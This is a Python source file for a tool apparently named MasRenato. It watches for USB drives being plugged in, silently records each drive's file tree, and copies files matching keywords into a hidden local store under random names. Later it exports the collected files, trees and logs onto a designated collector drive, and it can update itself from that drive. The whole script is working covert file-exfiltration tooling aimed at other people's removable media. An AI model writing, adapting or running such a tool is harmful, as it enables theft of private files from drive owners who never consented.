import os
import time
from psutil import disk_partitions, process_iter, Process
import shutil
import subprocess
import random
import pickle
from sys import argv, exit
import MasRenatoUpdate

foundMasRenatoProcess = 0
for process in process_iter():
    if process.name() == Process(os.getpid()).name():
        foundMasRenatoProcess += 1
if foundMasRenatoProcess > 2:
    exit()

# 创建目录
if not os.path.exists('log'):
    os.mkdir('log')
if not os.path.exists('tree'):
    os.mkdir('tree')
if not os.path.exists('data'):
    os.mkdir('data')

log = open(f'log/log_{time.time()}.log', 'w')  # 创建日志对象

keyWord = ["YOUR KEYWORD"]

if os.path.exists('file.masrenato'):
    with open('file.masrenato', 'rb') as fileNameTable_MasRenato_r:
        fileNameTable = pickle.load(fileNameTable_MasRenato_r)
else:
    fileNameTable = {}


updateFlag = False


def logger(info):  # 写日志
    try:
        print(info)
        log.write(f'[{time.ctime()}][{time.time()}] {info}\n')
    except Exception as e:
        logger(e)
        log.flush()


def make_tree_file(device):
    logger('Writing Tree')
    tree_file_name = f'tree_disk-{time.time()}.txt'
    subprocess.run(f'tree /F {device} > tree/{tree_file_name}', shell=True)
    logger(f'Output Tree to tree/{tree_file_name}')


def wait_for_device_plugged():
    while True:
        time.sleep(0.1)
        for item in disk_partitions():
            if 'removable' in item.opts:
                logger(f'Found {item.device}')
                return item.device


def wait_for_device_unplugged():
    logger(f'Disk {targetDisk} is complete')
    while True:
        time.sleep(0.1)
        disconnect = True
        for item in disk_partitions():
            if targetDisk == item.device:
                disconnect = False
        if disconnect:
            logger(f'{targetDisk} has been unplugged')
            break
    log.flush()


def get_file_list(device):  # 遍历U盘
    logger("Scanning disk")
    file_path_list = []
    for (path, dirs, files) in os.walk(device):
        for file_name in files:
            if key_word_filter(os.path.join(path, file_name)):
                file_path_list.append(os.path.join(path, file_name))  # 记录文件路径
                logger(f'Found {os.path.join(path, file_name)}')
            else:
                logger(f'Drop {os.path.join(path, file_name)}')

    logger("Scanning Done")
    return file_path_list


def key_word_filter(string):
    for keyword in keyWord:
        if string.find(keyword) != -1:
            return True
    return False


def copy_from(files):
    logger('Starting Copying')

    for file_name in files:
        if file_name.replace(targetDisk, '', 1) not in fileNameTable.values():
            try:
                random_file_name = str(random.randint(1000000000000000000000000000000000000000,
                                                      9999999999999999999999999999999999999999))  # 生成随机文件名
                fileNameTable[random_file_name] = file_name.replace(targetDisk, '', 1)
                shutil.copy2(file_name, f'data\\{random_file_name}')  # copy2 可保留元数据
                logger(f'Copied {file_name} as {random_file_name}')
            except Exception as e:
                logger(e)
                continue
        else:
            logger(f'Skipped {file_name}')
    write_pickle()
    logger(f'Copied {len(files)} files')
    log.flush()


def move_to():
    logger('Starting Moving to USB Device')
    # os.mkdir(f'{targetDisk}MasRenato\\Moving_is_in_progress')
    for (path, dirs, files) in os.walk('data'):
        for file in files:
            if file in fileNameTable:  # 确保文件在对应表内
                try:

                    os.makedirs(f'{targetDisk}MasRenato\\exported_data\\{os.path.dirname(fileNameTable[file])}',
                                exist_ok=True)
                    # noinspection PyTypeChecker
                    shutil.move(os.path.join(path, file),
                                f'{targetDisk}MasRenato\\exported_data\\{fileNameTable[file]}')  # 移动文件
                    logger(f'Moved {file} to {targetDisk}MasRenato\\exported_data\\{fileNameTable[file]}')
                except Exception as e:
                    logger(e)
                    continue

    log.flush()


def write_pickle():
    with open('file.masrenato', 'wb') as fileNameTable_MasRenato:
        pickle.dump(fileNameTable, fileNameTable_MasRenato)


def move_under_dir(src, dst):
    for (path, dirs, files) in os.walk(src):
        for file in files:
            # noinspection PyTypeChecker
            shutil.move(os.path.join(path, file), f'{dst}{file}')


def check_argv():
    if argv[1] == '--rename-old':
        MasRenatoUpdate.rename_old()
    elif argv[1] == '--rename-new':
        MasRenatoUpdate.rename_new()
    elif argv[1] == '--remove-old':
        MasRenatoUpdate.remove_old()
        global updateFlag
        updateFlag = True


def move_tree_log():
    global log
    os.makedirs(f'{targetDisk}MasRenato\\exported_tree', exist_ok=True)
    os.makedirs(f'{targetDisk}MasRenato\\exported_log', exist_ok=True)
    move_under_dir('tree', f'{targetDisk}MasRenato\\exported_tree\\')
    log.flush()
    log.close()
    move_under_dir('log', f'{targetDisk}MasRenato\\exported_log\\')
    log = open(f'log/log_{time.time()}.log', 'w', encoding='utf-8')  # 创建目录对象


if __name__ == '__main__':
    logger('Starting...')

    if len(argv) > 1:
        check_argv()

    while True:
        try:
            targetDisk = wait_for_device_plugged()  # 等待U盘插入
            # targetDisk = 'C:\\'

            if os.path.exists(f'{targetDisk}MasRenato\\$MasRenato'):
                if os.path.exists(f'{targetDisk}MasRenato\\$MasRenatoUpdate') and updateFlag:
                    os.remove(f'{targetDisk}MasRenato\\$MasRenatoUpdate')
                    updateFlag = False
                if os.path.exists(f'{targetDisk}MasRenato\\$MasRenatoUpdate'):  # 更新
                    MasRenatoUpdate.copy_new(targetDisk)
                else:
                    move_to()
                    logger('Moving tree and log')
                    move_tree_log()
            else:
                # time.sleep(300)

                make_tree_file(targetDisk)  # 写文件树
                log.flush()

                filePathList = get_file_list(targetDisk)  # 获取文件列表
                log.flush()

                copy_from(filePathList)

            wait_for_device_unplugged()  # 结束，等待U盘拔出
            log.flush()
            write_pickle()
        except Exception as e:
            logger(e)
            continue
